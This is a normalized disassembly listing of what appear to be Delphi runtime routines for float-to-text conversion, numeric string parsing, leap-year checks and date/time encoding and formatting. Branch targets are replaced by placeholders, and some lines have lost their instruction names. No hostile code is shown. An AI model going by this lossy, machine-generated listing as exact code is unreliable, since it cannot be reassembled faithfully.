mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408d28
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_408ffc
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_408e27
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_408e31
call sub_408e27
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408ce4
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_408e8d
call sub_408e27
call sub_408e1e
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_408e1e
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408ce4
retn
xor ecx ecx
sub_408ec9
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_408e1e
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_408e1e
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_408f2e
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_408f82
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_408ec9
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_408ffc
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_409029
jmp r-xdata
call sub_40914b
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_409029
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402dec
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_40914b
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_409228
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_4092df
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_4092ea
neg edx
mov ecx esi
call sub_4092ea
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_4092df
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_409306
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402dec
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_4092ea
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_409306
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_40933c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408d28
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4040d0
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40936c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408d28
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4040d0
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4093b8
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044a0
mov edx esp
xor ecx ecx
call sub_409228
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4093e4
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044a0
mov edx esp
xor ecx ecx
call sub_409228
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_40942c
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_409470
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_4094e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_40942c
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407b04
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407b04
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407b04
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40953c
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409578
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_40953c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409640
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_40942c
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407b04
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407b04
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407b04
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_40953c
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_40978c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409640
pop esi
pop ecx
pop ebp
retn 0x8
sub_4097ac
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_40942c
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4097e8
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028b8
sub_40982c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4042a0
mov edx eax
mov eax ebx
call sub_4097e8
pop ecx
pop ebx
pop ebp
retn
sub_40984c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408818
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_4097e8
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409898
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_4098c4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_40978c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_4098fc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_4094e0
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_40993c
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409a8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403fe0
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404078
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4044a0
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409a91
lea eax [ ebp - 0x118 ]
call sub_403fe0
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404250
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_4042a0
mov edx eax
mov eax [ ebx ]
call sub_40be80
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40bff4
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_404500
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40bf90
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_4041d8
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40bff4
mov ecx eax
mov eax ebx
mov edx esi
call sub_4040d0
sub_409aa4
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409b82
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403fe0
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404078
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404078
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409b89
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404250
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4044a0
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_4042a0
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404500
sub_409bac
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a32d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a334
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_404004
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c074
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c054
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4097e8
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c074
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_4097e8
pop ecx
mov al [ eax + lookup_table_409c8f ]
jmp [ eax * 4 + jump_table_409cc8 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409898
pop ecx
push ebp
call sub_4098c4
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409898
pop ecx
push ebp
call sub_4098c4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_40993c
pop ecx
mov eax [ ebp - 0x24 ]
call sub_40982c
pop ecx
jmp r-xdata
push ebp
call sub_409898
pop ecx
push ebp
call sub_4098c4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409aa4
pop ecx
mov eax [ ebp - 0x28 ]
call sub_40982c
pop ecx
jmp r-xdata
push ebp
call sub_409898
pop ecx
push ebp
call sub_4098c4
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409898
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409898
pop ecx
push ebp
call sub_4098fc
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409898
pop ecx
push ebp
call sub_4098fc
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409898
pop ecx
push ebp
call sub_4098fc
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409898
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409898
pop ecx
push ebp
call sub_4098fc
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_4098fc
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408688
test eax eax
jne r-xdata
push ebp
call sub_409898
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409bac
pop ecx
push ebp
